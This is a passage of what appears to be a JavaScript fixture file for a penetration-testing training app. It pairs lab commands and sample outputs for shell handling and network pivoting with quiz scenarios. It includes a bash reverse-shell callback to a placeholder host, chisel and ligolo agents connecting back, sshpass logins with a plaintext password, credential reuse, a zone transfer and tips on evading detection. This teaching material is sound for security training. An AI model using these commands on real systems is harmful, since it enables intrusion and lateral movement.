      {"t":"Batch your enumeration","d":"Chain several checks in one call so you read all the answers at once instead of typing them into a shaky shell.","demo":[{"run":"sshpass -p 'Autumn2026!' ssh bob@10.10.10.10 'id; sudo -l; find / -perm -4000 -type f 2>/dev/null'","out":"uid=1000(bob) groups=1000(bob),27(sudo)\n(ALL) NOPASSWD: /usr/bin/find\n/usr/bin/find\n/usr/bin/passwd","sig":"NOPASSWD: /usr/bin/find"}],"note":"sudo find with NOPASSWD is an instant GTFOBins root; one call surfaced the whole path."},
      {"t":"Prefer a key over a password","d":"A private key avoids sshpass and works where password auth is disabled; same non-interactive command run.","demo":[{"run":"ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10 'cat /home/bob/user.txt'","out":"c1d9f4a70b2e85d3f6a1c0b7e2d84a59","sig":"c1d9f4a70b2e85d3f6a1c0b7e2d84a59"}],"note":"A key keeps working even when PasswordAuthentication is off."}]}
  };
  Object.keys(SHELLS_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = SHELLS_HOW[k]; });

  var SHELLS_PRACTICE = {
    "ssh-key-login": {situation:"You pulled /home/bob/.ssh/id_rsa through an LFI. Your first ssh -i id_rsa bob@target fails with 'Permissions 0644 for id_rsa are too open. This private key will be ignored.' What is the real fix?", choices:["ssh-key-login","online-brute-ssh","shell-revshell-linux","linux-remote-exec"], coach:{"online-brute-ssh":"You already hold the key; this is a file-permissions refusal, not an authentication failure, so brute-forcing wastes time.","shell-revshell-linux":"You have no code execution to fire a payload from; the key is your way in, once chmod 600 makes SSH accept it.","linux-remote-exec":"Same key, so it would hit the same refusal; fix the key's mode first, then interactive login or non-interactive runs both work."}},
    "shell-listener": {situation:"You are about to trigger a command-injection payload that runs bash -i >& /dev/tcp/<LHOST>/4444. What must be true first?", choices:["shell-listener","shell-pty-upgrade","shell-revshell-windows","linux-remote-exec"], coach:{"shell-pty-upgrade":"That comes after the shell lands; with nothing catching the callback there is no shell to upgrade.","shell-revshell-windows":"Wrong platform and wrong order; the payload is a Linux bash callback, and either way the catcher goes up first.","linux-remote-exec":"You have no credentials here, only an injection bug; the reverse shell is your way in, and it needs a listener waiting."}},
    "shell-revshell-linux": {situation:"You have command injection on a Linux web app and a listener bound on 4444. which bash returns nothing. How do you still get a shell?", choices:["shell-revshell-linux","shell-revshell-windows","shell-listener","ssh-key-login"], coach:{"shell-revshell-windows":"Wrong platform; this is a Linux box, so use a payload that does not need bash, like the python or mkfifo fallback.","shell-listener":"Already done, the catcher is bound; now deliver a payload the box can actually run.","ssh-key-login":"You have no key and no creds here; command injection plus a non-bash payload is your route to a shell."}},
    "shell-revshell-windows": {situation:"You run commands as the app-pool user on an IIS box. Your stock PowerShell reverse-shell one-liner connects, the shell dies instantly, and an alert fires. What is the lesson?", choices:["shell-revshell-windows","shell-pty-upgrade","shell-listener","seimpersonate"], coach:{"shell-pty-upgrade":"The shell never survived long enough to upgrade; the problem is AV killing the payload, not a dumb terminal.","shell-listener":"The listener worked and the callback arrived; the payload itself got flagged, so the fix is a quieter variant.","seimpersonate":"That is the privesc after you hold a stable shell; first you need a payload Defender does not kill on sight."}},
    "shell-pty-upgrade": {situation:"You caught a netcat shell as www-data and typed su - to use a known root password. It hangs with no prompt. Why, and what fixes it?", choices:["shell-pty-upgrade","shell-revshell-linux","linux-remote-exec","shell-listener"], coach:{"shell-revshell-linux":"You already have a shell; re-firing the payload just gives you another dumb one with the same problem.","linux-remote-exec":"You have no SSH credentials; the fix is to upgrade the shell you already hold so su can read its password prompt.","shell-listener":"The listener did its job and the shell is here; su hangs because the shell has no PTY, not because of the catcher."}},
    "linux-remote-exec": {situation:"You cracked bob's password and SSH is open. You want to run id, sudo -l, and a SUID sweep without babysitting a fragile shell. What is the cleanest move?", choices:["linux-remote-exec","shell-revshell-linux","shell-listener","ssh-key-login"], coach:{"shell-revshell-linux":"That gives you a fragile interactive shell; with working creds, non-interactive SSH commands are cleaner and scriptable.","shell-listener":"No callback is involved; you hold credentials, so run commands straight over SSH.","ssh-key-login":"You have a password, not a key; sshpass runs your commands over SSH without one."}}
  };
  Object.keys(SHELLS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = SHELLS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === PIVOT LANE =================================================================================
  var PIVOT_LEADUPS = {
    "local-linux-interfaces": [
      { key: "foothold", label: "You just landed a Linux shell", steps: [
        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The first orientation question on any foothold: what networks can this box see that you cannot?" } ] },
    ],
    "local-linux-routes": [
      { key: "foothold", label: "You have a Linux shell and checked interfaces", steps: [
        { title: "A second NIC hinted at more network", tool: "ssh", where: "host", cmd: "ip -o addr show eth1", out: "3: eth1    inet 172.16.5.10/24 scope global eth1", sig: "172.16.5.10/24", teach: "The interface read showed a second subnet; the routing table tells you every network this box can reach, not just its own NICs." } ] },
    ],
    "local-linux-neighbors": [
      { key: "foothold", label: "You have a Linux shell", steps: [
        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The neighbour cache is a free list of internal hosts this box has actually talked to, no scan needed." } ] },
    ],
    "local-linux-dns": [
      { key: "foothold", label: "You have a Linux shell", steps: [
        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The resolver config names the internal DNS, which is both a high-value target and a map of the whole estate." } ] },
    ],
    "local-windows-interfaces": [
      { key: "winrm", label: "You have a WinRM foothold", steps: [
        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "You can run commands on the Windows box; the first thing to ask is which networks it bridges." } ] },
    ],
    "local-windows-routes": [
      { key: "winrm", label: "You have a WinRM foothold", steps: [
        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "With commands running, the route table shows which internal subnets this box can reach directly." } ] },
    ],
    "local-windows-neighbors": [
      { key: "winrm", label: "You have a WinRM foothold", steps: [
        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "The ARP cache names internal hosts this box has already talked to, free confirmed-live targets." } ] },
    ],
    "local-windows-listeners": [
      { key: "winrm", label: "You have a WinRM foothold", steps: [
        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "Listening sockets reveal services bound to localhost that only a port-forward can reach." } ] },
    ],
    "pivot-chisel-socks": [
      { key: "mapped", label: "You found a subnet you cannot reach", steps: [
        { title: "A route points at an unreachable subnet", tool: "ssh", where: "host", cmd: "ip route", out: "default via 10.10.10.1 dev eth0\n172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "The box routes to 172.16.5.0/24 but you cannot touch it from Kali; chisel will carry your tools there." } ] },
    ],
    "pivot-ligolo": [
      { key: "mapped", label: "An internal subnet is in range", steps: [
        { title: "A route exposes the internal subnet", tool: "ssh", where: "host", cmd: "ip route", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "You want native tooling against 172.16.5.0/24; ligolo gives your box a real interface onto it." } ] },
    ],
    "pivot-sshuttle": [
      { key: "sshcreds", label: "You have SSH on the foothold", steps: [
        { title: "SSH works and the box routes inward", tool: "ssh", where: "local", cmd: "sshpass -p 'Autumn2026!' ssh bob@10.10.10.10 'ip route'", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "SSH access plus a routed internal subnet is all sshuttle needs, no agent, no proxychains." } ] },
    ],
    "pivot-ssh-dynamic": [
      { key: "sshcreds", label: "You hold SSH credentials", steps: [
        { title: "SSH works with your creds", tool: "ssh", where: "local", cmd: "ssh bob@10.10.10.10 'ip route'", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "One SSH flag turns this access into a SOCKS proxy, with nothing uploaded to the box." } ] },
    ],
    "pivot-scan-through": [
      { key: "tunnelup", label: "A SOCKS tunnel is live", steps: [
        { title: "proxychains points at the tunnel", tool: "cat", where: "local", cmd: "tail -1 /etc/proxychains4.conf", out: "socks5 127.0.0.1 1080", sig: "socks5 127.0.0.1 1080", teach: "With the SOCKS proxy configured, every proxychains-wrapped command exits through the foothold." } ] },
    ]
  };
  Object.keys(PIVOT_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = PIVOT_LEADUPS[k]; });

  var PIVOT_HOW = {
    "local-linux-interfaces": {"lead":"Read every interface; a second NIC is the clearest sign of a network behind this host.","items":[
      {"t":"List addresses with ip","d":"ip -o addr show prints one line per interface; look for a private-range address beyond the one you came in on.","demo":[{"run":"ip -o addr show","out":"1: lo    inet 127.0.0.1/8 scope host lo\n2: eth0  inet 10.10.10.10/24 scope global eth0\n3: eth1  inet 172.16.5.10/24 scope global eth1","sig":"eth1  inet 172.16.5.10/24"}],"note":"eth1 on 172.16.5.0/24 is a network you could not reach from outside; that is your pivot target."},
      {"t":"ifconfig when ip is absent","d":"Older or minimal boxes may only have ifconfig; same information, different format.","demo":[{"run":"ifconfig eth1","out":"eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n        inet 172.16.5.10  netmask 255.255.255.0","sig":"inet 172.16.5.10"}],"note":"The second subnet confirms the box is dual-homed."},
      {"t":"Confirm it is a new subnet","d":"Compare each interface's subnet to the one you arrived on; anything different is reachable only through this host.","demo":[{"run":"ip -o addr show | awk '{print $2, $4}'","out":"lo 127.0.0.1/8\neth0 10.10.10.10/24\neth1 172.16.5.10/24","sig":"eth1 172.16.5.10/24"}],"note":"Two distinct subnets means a pivot is possible; one NIC means this box is a dead end for pivoting."}]},
    "local-linux-routes": {"lead":"The routing table names the subnets this host can reach directly; anything you cannot touch from Kali is a pivot candidate.","items":[
      {"t":"Print the routes","d":"ip route lists each network and the interface that reaches it; look past the default route for internal subnets.","demo":[{"run":"ip route","out":"default via 10.10.10.1 dev eth0\n10.10.10.0/24 dev eth0 proto kernel scope link\n172.16.5.0/24 dev eth1 proto kernel scope link","sig":"172.16.5.0/24 dev eth1"}],"note":"172.16.5.0/24 on eth1 is reachable from here but not from your box; that is the pivot target."},
      {"t":"Spot a gateway to elsewhere","d":"A route via a gateway other than your own hints at further networks behind that next hop.","demo":[{"run":"ip route get 172.16.99.1","out":"172.16.99.1 via 172.16.5.1 dev eth1 src 172.16.5.10","sig":"via 172.16.5.1"}],"note":"The box forwards toward 172.16.99.0/24 via 172.16.5.1, a second layer to reach later."},
      {"t":"Fallback: route -n","d":"On minimal boxes without iproute2, route -n or netstat -rn print the same table.","demo":[{"run":"route -n","out":"Destination   Gateway    Genmask         Iface\n172.16.5.0    0.0.0.0    255.255.255.0   eth1","sig":"172.16.5.0"}],"note":"Same information; note the internal destination and its interface."}]},
    "local-linux-neighbors": {"lead":"The ARP/neighbour cache lists confirmed-live internal hosts without sending a single scan packet.","items":[
      {"t":"Read the neighbour cache","d":"ip neigh show lists each internal host this box has an ARP entry for, meaning it has exchanged packets with it.","demo":[{"run":"ip neigh show","out":"172.16.5.1 dev eth1 lladdr 00:50:56:a1:01:02 REACHABLE\n172.16.5.20 dev eth1 lladdr 00:50:56:a1:03:04 STALE","sig":"172.16.5.20"}],"note":"172.16.5.20 is a confirmed live neighbour; make it your first internal target."},
      {"t":"Prefer REACHABLE entries","d":"REACHABLE means recently confirmed; STALE is older but still a real host that answered at some point.","demo":[{"run":"ip neigh show | grep -E 'REACHABLE|STALE'","out":"172.16.5.1 dev eth1 lladdr 00:50:56:a1:01:02 REACHABLE\n172.16.5.20 dev eth1 lladdr 00:50:56:a1:03:04 STALE","sig":"REACHABLE"}],"note":"Start with REACHABLE hosts; they are alive right now."},
      {"t":"Fallback: arp -a","d":"Without iproute2, arp -a prints the same cache in BSD format.","demo":[{"run":"arp -a","out":"? (172.16.5.20) at 00:50:56:a1:03:04 [ether] on eth1","sig":"172.16.5.20"}],"note":"Same host, confirmed by its MAC; validate it once the tunnel is up."}]},
    "local-linux-dns": {"lead":"resolv.conf reveals the internal nameservers and search domain; internal DNS often knows every hostname in the estate.","items":[
      {"t":"Read the resolver","d":"cat /etc/resolv.conf shows the nameserver and search domain this host uses.","demo":[{"run":"cat /etc/resolv.conf","out":"search acme.internal\nnameserver 172.16.5.5","sig":"nameserver 172.16.5.5"}],"note":"172.16.5.5 is the internal DNS, likely the domain controller; acme.internal is the AD domain."},
      {"t":"Confirm it resolves internal names","d":"Once a tunnel is up, query the internal DNS for interesting names to map the estate without scanning.","demo":[{"run":"nslookup dc01.acme.internal 172.16.5.5","out":"Server:  172.16.5.5\nName:    dc01.acme.internal\nAddress: 172.16.5.5","sig":"dc01.acme.internal"}],"note":"The nameserver is also the DC; internal DNS turns names into a target list."},
      {"t":"Try a zone transfer","d":"A misconfigured internal DNS may allow AXFR, dumping every record at once.","demo":[{"run":"dig axfr acme.internal @172.16.5.5","out":"dc01.acme.internal.   IN A 172.16.5.5\nfile01.acme.internal. IN A 172.16.5.20","sig":"file01.acme.internal"}],"note":"A successful AXFR hands you the whole internal host list by name."}]},
    "local-windows-interfaces": {"lead":"ipconfig reveals extra NICs; a second private address is a segment reachable only through this host.","items":[
      {"t":"List adapters with ipconfig","d":"ipconfig /all prints every adapter and its address and DNS; look for a second private-range IP.","demo":[{"run":"ipconfig /all","out":"Ethernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . : 10.10.10.20\nEthernet adapter Ethernet1:\n   IPv4 Address. . . . . . . . : 172.16.5.20","sig":"172.16.5.20"}],"note":"172.16.5.20 faces the internal server segment, typically where the DCs live."},
      {"t":"Just the addresses","d":"Plain ipconfig is a terser view when /all is too noisy.","demo":[{"run":"ipconfig","out":"Ethernet adapter Ethernet1:\n   IPv4 Address. . . . . . . . : 172.16.5.20\n   Subnet Mask . . . . . . . . : 255.255.255.0","sig":"172.16.5.20"}],"note":"Two subnets confirm the host is dual-homed and worth pivoting through."},
      {"t":"PowerShell alternative","d":"Get-NetIPAddress is scriptable and filters to the interesting families.","demo":[{"run":"powershell -c \"Get-NetIPAddress -AddressFamily IPv4 | ft IPAddress,InterfaceAlias\"","out":"IPAddress     InterfaceAlias\n10.10.10.20   Ethernet0\n172.16.5.20   Ethernet1","sig":"172.16.5.20   Ethernet1"}],"note":"Same conclusion: Ethernet1 is your path into the internal range."}]},
    "local-windows-routes": {"lead":"route print lists the networks this host routes to; internal destinations are your pivot candidates.","items":[
      {"t":"Print the route table","d":"route print shows IPv4 routes; look under the internal NIC for private subnets.","demo":[{"run":"route print","out":"Network Destination    Netmask          Gateway       Interface\n172.16.5.0       255.255.255.0    On-link       172.16.5.20","sig":"172.16.5.0"}],"note":"An on-link 172.16.5.0/24 route means the box reaches that subnet directly."},
      {"t":"PowerShell alternative","d":"Get-NetRoute is cleaner and scriptable than route print.","demo":[{"run":"powershell -c \"Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,InterfaceAlias\"","out":"DestinationPrefix   InterfaceAlias\n0.0.0.0/0           Ethernet0\n172.16.5.0/24       Ethernet1","sig":"172.16.5.0/24"}],"note":"172.16.5.0/24 on Ethernet1 is reachable from here, not from your box."},
      {"t":"Check a far destination","d":"Find-NetRoute tests whether the box routes toward a deeper network via an internal gateway.","demo":[{"run":"powershell -c \"Find-NetRoute -RemoteIPAddress 172.16.99.10 | ft NextHop,InterfaceAlias\"","out":"NextHop       InterfaceAlias\n172.16.5.1    Ethernet1","sig":"172.16.5.1"}],"note":"The box forwards toward 172.16.99.0/24 via 172.16.5.1, a second hop to plan for."}]},
    "local-windows-neighbors": {"lead":"arp -a lists confirmed-alive internal hosts without sending a scan.","items":[
      {"t":"Read the ARP cache","d":"arp -a prints each interface's cache; entries on the internal NIC are live neighbours.","demo":[{"run":"arp -a","out":"Interface: 172.16.5.20 --- 0x5\n  Internet Address      Physical Address      Type\n  172.16.5.5            00-50-56-a1-01-02     dynamic\n  172.16.5.25           00-50-56-a1-05-06     dynamic","sig":"172.16.5.25"}],"note":"172.16.5.25 is a live neighbour this box has reached, a strong first internal target."},
      {"t":"PowerShell alternative","d":"Get-NetNeighbor filters to reachable entries and is easy to script.","demo":[{"run":"powershell -c \"Get-NetNeighbor -AddressFamily IPv4 | ? State -ne Unreachable | ft IPAddress,State\"","out":"IPAddress      State\n172.16.5.5     Reachable\n172.16.5.25    Stale","sig":"172.16.5.5"}],"note":"Reachable entries are alive right now; start there."},
      {"t":"Note the gateway","d":"The gateway's entry confirms the internal router and anchors the segment as real.","demo":[{"run":"arp -a | findstr 172.16.5.1","out":"  172.16.5.1            00-50-56-a1-00-01     dynamic","sig":"172.16.5.1"}],"note":"The internal gateway is live, so the segment is real and routable."}]},
    "local-windows-listeners": {"lead":"netstat -ano shows local services, including loopback-only ones that a port-forward unlocks.","items":[
      {"t":"List listening sockets","d":"netstat -ano lists listeners and owning PIDs; watch for services bound to 127.0.0.1.","demo":[{"run":"netstat -ano | findstr LISTENING","out":"TCP    0.0.0.0:445      0.0.0.0:0    LISTENING   4\nTCP    127.0.0.1:1433   0.0.0.0:0    LISTENING   3120","sig":"127.0.0.1:1433"}],"note":"MSSQL on 127.0.0.1:1433 is invisible from the network but open to you on the box."},
      {"t":"Map a PID to a process","d":"tasklist tells you what owns a loopback port, so you know what you would forward to.","demo":[{"run":"tasklist /fi \"PID eq 3120\"","out":"Image Name           PID Session Name\nsqlservr.exe        3120 Services","sig":"sqlservr.exe"}],"note":"The loopback 1433 is SQL Server; a port-forward turns it into a reachable target."},
      {"t":"PowerShell alternative","d":"Get-NetTCPConnection filters to listeners and shows the owning process inline.","demo":[{"run":"powershell -c \"Get-NetTCPConnection -State Listen | ? LocalAddress -eq '127.0.0.1' | ft LocalPort,OwningProcess\"","out":"LocalPort  OwningProcess\n1433       3120","sig":"1433"}],"note":"Only loopback services need a forward; network-bound ones you can already reach through the pivot."}]},
    "pivot-chisel-socks": {"lead":"chisel is not on the target yet, so the chain is: server on your box, pull the binary down, run the client, point proxychains at the SOCKS port.","items":[
      {"t":"Start the reverse server (your box)","d":"The --reverse server listens for the agent and exposes a SOCKS port locally once it connects.","demo":[{"run":"chisel server -p 8080 --reverse","out":"server: Reverse tunnelling enabled\nserver: Listening on http://0.0.0.0:8080","sig":"Reverse tunnelling enabled"}],"note":"Serve the chisel binary over HTTP so the target can fetch it next."},
      {"t":"Run the client (on the target)","d":"The agent connects back and asks for a reverse SOCKS (R:socks), which surfaces on your box as 127.0.0.1:1080.","demo":[{"run":"./chisel client <LHOST>:8080 R:socks","out":"client: Connecting to ws://<LHOST>:8080\nclient: Connected (Latency 42ms)","sig":"client: Connected"}],"note":"Connected means the SOCKS proxy is live on your 1080."},
      {"t":"Point proxychains at it","d":"Set socks5 127.0.0.1 1080 in proxychains.conf, then wrap any tool to route through the tunnel.","demo":[{"run":"tail -1 /etc/proxychains4.conf","out":"socks5 127.0.0.1 1080","sig":"socks5 127.0.0.1 1080"}],"note":"Now proxychains nmap or crackmapexec reach 172.16.5.0/24 through the foothold."}]},
    "pivot-ligolo": {"lead":"ligolo spans both machines: create the tun and start the proxy on your box, run the agent on the target, then add the route.","items":[
      {"t":"Create the tun and start the proxy (your box)","d":"Make a tun interface named ligolo, bring it up, then start the proxy with a self-signed cert.","demo":[{"run":"sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert","out":"INFO[0000] Listening on 0.0.0.0:11601\nINFO[0000] Waiting for agent...","sig":"Listening on 0.0.0.0:11601"}],"note":"The proxy waits for the agent on 11601."},
      {"t":"Run the agent (on the target)","d":"The agent connects back to your proxy; -ignore-cert accepts the self-signed cert.","demo":[{"run":"./agent -connect <LHOST>:11601 -ignore-cert","out":"INFO[0000] Connection established    addr=<LHOST>:11601","sig":"Connection established"}],"note":"In the proxy console a new session appears; select it with `session` and start it."},
      {"t":"Add the route (your box)","d":"Once the session is started, add a host-side route so your box sends that subnet through the tunnel.","demo":[{"run":"sudo ip route add 172.16.5.0/24 dev ligolo && ip route | grep ligolo","out":"172.16.5.0/24 dev ligolo scope link","sig":"172.16.5.0/24 dev ligolo"}],"note":"Your box now routes that subnet through the tunnel; tools hit it natively, no proxychains."}]},
    "pivot-sshuttle": {"lead":"sshuttle runs entirely from your box over the SSH session; one command carries the subnet.","items":[
      {"t":"Carry a subnet over SSH","d":"sshuttle -r user@host SUBNET builds the transparent route; add --dns to send internal lookups through too.","demo":[{"run":"sshuttle -r bob@10.10.10.10 172.16.5.0/24","out":"c : Connected to server.","sig":"Connected to server."}],"note":"Traffic to 172.16.5.0/24 now routes over SSH, with no proxychains wrapper."},
      {"t":"Use a key instead of a password","d":"Point sshuttle at a key with --ssh-cmd when password auth is off.","demo":[{"run":"sshuttle --ssh-cmd 'ssh -i id_rsa' -r bob@10.10.10.10 172.16.5.0/24","out":"c : Connected to server.","sig":"Connected to server."}],"note":"Same transparent route, authenticated by the key."},
      {"t":"Confirm the route works","d":"Hit the internal host directly, with no wrapper; sshuttle intercepts and tunnels it.","demo":[{"run":"nmap -sT -Pn 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n445/tcp open  microsoft-ds","sig":"445/tcp open"}],"note":"A direct nmap now reaches the internal host because sshuttle routes it transparently."}]},
    "pivot-ssh-dynamic": {"lead":"ssh -D opens a SOCKS proxy; proxychains carries your tools through it.","items":[
      {"t":"Open the dynamic forward","d":"ssh -fND 1080 opens a backgrounded SOCKS proxy on 1080 and runs no remote command, just the tunnel.","demo":[{"run":"ssh -fND 1080 bob@10.10.10.10 && ss -tlnp | grep 1080","out":"LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*","sig":"127.0.0.1:1080"}],"note":"-f backgrounds it; the listening socket on 1080 confirms the proxy is up."},
      {"t":"Point proxychains at 1080","d":"Set socks5 127.0.0.1 1080 in proxychains.conf so tools route through the SSH tunnel.","demo":[{"run":"tail -1 /etc/proxychains4.conf","out":"socks5 127.0.0.1 1080","sig":"socks5 127.0.0.1 1080"}],"note":"Any proxychains-wrapped tool now exits via the foothold."},
      {"t":"Reach the internal host","d":"Wrap a connect scan in proxychains to enumerate through the tunnel.","demo":[{"run":"proxychains -q nmap -sT -Pn 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n445/tcp open  microsoft-ds","sig":"445/tcp open"}],"note":"Enumeration restarts one network deeper, through a single SSH flag."}]},
    "pivot-scan-through": {"lead":"Through a proxy, force TCP connect (-sT) and skip discovery (-Pn), then enumerate the internal host as if starting over.","items":[
      {"t":"Connect-scan the host","d":"-sT does a full TCP handshake (the only kind that survives SOCKS); -Pn skips the ping that a proxy drops.","demo":[{"run":"proxychains -q nmap -sT -Pn -n 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server","sig":"445/tcp  open"}],"note":"A Windows host one network deeper; enumerate its services next."},
      {"t":"Scope the ports to stay fast","d":"Proxied scans are slow, so target the ports you care about rather than all 65535.","demo":[{"run":"proxychains -q nmap -sT -Pn -p 445,3389,5985 172.16.5.20","out":"445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman","sig":"5985/tcp open"}],"note":"5985 open means WinRM; a working credential could land you a shell on this internal box."},
      {"t":"Pivot your other tools too","d":"Anything that speaks TCP works through proxychains: crackmapexec, impacket, a browser.","demo":[{"run":"proxychains -q nxc smb 172.16.5.20 -u bob -p 'Autumn2026!'","out":"SMB  172.16.5.20  445  FILE01  [+] corp.local\\bob","sig":"corp.local\\bob"}],"note":"The same creds from the foothold often work on the internal host; keep reusing them."}]}
  };
  Object.keys(PIVOT_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = PIVOT_HOW[k]; });

  var PIVOT_PRACTICE = {
    "local-linux-interfaces": {situation:"You just landed a shell on a Linux box and want to know if a pivot is even possible. What is the first thing to check?", choices:["local-linux-interfaces","local-linux-routes","pivot-chisel-socks","pivot-scan-through"], coach:{"local-linux-routes":"A strong complementary check, but the interface list is the quickest proof of a second, internal-facing NIC.","pivot-chisel-socks":"That is the tunnel you build once you have confirmed an internal segment exists; check the interfaces first.","pivot-scan-through":"Too early, you have no tunnel yet; first confirm the box can even see another network."}},
    "local-linux-routes": {situation:"You are on a Linux foothold and want to know which internal networks this box can reach, including any via a gateway, before building a tunnel. What do you read?", choices:["local-linux-routes","local-linux-interfaces","local-linux-neighbors","pivot-sshuttle"], coach:{"local-linux-interfaces":"Interfaces show the box's own addresses; the routing table additionally shows networks it reaches through a gateway.","local-linux-neighbors":"The ARP cache lists individual hosts, not whole subnets; routes name the networks to aim a tunnel at.","pivot-sshuttle":"That is the tunnel you build after you know the subnet; routes are how you learn the subnet first."}},
    "local-linux-neighbors": {situation:"You want a short list of internal hosts that are definitely alive, without scanning and tipping off a defender. What do you read on the foothold?", choices:["local-linux-neighbors","local-linux-routes","pivot-scan-through","local-linux-interfaces"], coach:{"local-linux-routes":"Routes give subnets, not individual live hosts; the ARP cache names machines that actually answered.","pivot-scan-through":"That sends packets and needs a tunnel first; the ARP cache gives live hosts for free, no scan.","local-linux-interfaces":"Interfaces show this box's own NICs; the neighbour cache shows the other machines it has talked to."}},
    "local-linux-dns": {situation:"You want to map internal hostnames and find the domain controller without sweeping IPs. What on the Linux foothold points you there?", choices:["local-linux-dns","local-linux-neighbors","local-linux-routes","pivot-ligolo"], coach:{"local-linux-neighbors":"That lists live IPs, not names or infrastructure; resolv.conf names the DNS server that knows the whole estate.","local-linux-routes":"Routes give subnets; the resolver gives you the internal DNS, which maps names to hosts.","pivot-ligolo":"That is the tunnel you build afterward; first read the resolver to know what to look for."}},
    "local-windows-interfaces": {situation:"You have a WinRM foothold on a server and want to know if it bridges into the internal network. What do you check first?", choices:["local-windows-interfaces","local-windows-routes","local-windows-listeners","pivot-chisel-socks"], coach:{"local-windows-routes":"A good follow-up, but the interface list is the quickest proof of a second, internal-facing NIC.","local-windows-listeners":"That shows local services, not networks; interfaces tell you whether a pivot is even possible.","pivot-chisel-socks":"That is the tunnel you build once you have confirmed an internal segment; check the interfaces first."}},
    "local-windows-routes": {situation:"On a Windows foothold you want the exact internal subnets this box can reach before tunnelling. What do you read?", choices:["local-windows-routes","local-windows-interfaces","local-windows-neighbors","pivot-ssh-dynamic"], coach:{"local-windows-interfaces":"Interfaces show the box's own addresses; the route table adds networks it reaches through a gateway.","local-windows-neighbors":"The ARP cache lists individual hosts, not subnets; routes name the networks to aim at.","pivot-ssh-dynamic":"That needs SSH, which Windows rarely offers, and it is the tunnel step, after you know the subnet."}},
    "local-windows-neighbors": {situation:"You want a no-scan list of live internal hosts from a Windows foothold, to avoid tipping off monitoring. What do you read?", choices:["local-windows-neighbors","local-windows-listeners","local-windows-routes","pivot-scan-through"], coach:{"local-windows-listeners":"That shows services on this box, not other live hosts; the ARP cache names the neighbours.","local-windows-routes":"Routes give subnets, not individual confirmed-live hosts; the ARP cache gives the latter for free.","pivot-scan-through":"That sends packets and needs a tunnel; the ARP cache lists live hosts without a single scan packet."}},
    "local-windows-listeners": {situation:"On a Windows foothold, netstat shows MSSQL listening on 127.0.0.1:1433 and you cannot reach it from the network. What does that tell you to set up?", choices:["local-windows-listeners","pivot-scan-through","local-windows-routes","pivot-sshuttle"], coach:{"pivot-scan-through":"A network scan will never see a loopback-only service; the listener read revealed it, and a port-forward is how you reach it.","local-windows-routes":"Routes are about networks, not a service bound to localhost on this very box; the listener view is the relevant one.","pivot-sshuttle":"That tunnels a whole subnet and needs SSH; a loopback service needs a local port-forward, which the listener view told you to build."}},
    "pivot-chisel-socks": {situation:"The foothold routes to 172.16.5.0/24 but cannot accept inbound connections (firewalled), and it has no SSH. You need your Kali tools on that segment. Which pivot fits?", choices:["pivot-chisel-socks","pivot-ssh-dynamic","pivot-scan-through","local-linux-routes"], coach:{"pivot-ssh-dynamic":"That needs SSH on the foothold; here there is none, and a reverse chisel works even when the box cannot accept inbound.","pivot-scan-through":"That is what you do after the tunnel is up; first you need the tunnel.","local-linux-routes":"Already done, that is how you learned about 172.16.5.0/24; now carry your tools there."}},
    "pivot-ligolo": {situation:"You have an internal subnet in range and want to run SYN scans and tools that break under a SOCKS proxy, with no proxychains wrapping. Which pivot?", choices:["pivot-ligolo","pivot-chisel-socks","pivot-sshuttle","pivot-scan-through"], coach:{"pivot-chisel-socks":"That gives a SOCKS proxy, so you still wrap tools in proxychains and lose SYN scans; ligolo's tun interface avoids both.","pivot-sshuttle":"That needs SSH creds on the foothold; ligolo works from just an uploaded agent and also gives a native interface.","pivot-scan-through":"That is the scan you run after the tunnel, and it assumes a SOCKS proxy with -sT; ligolo lets you skip that constraint."}},
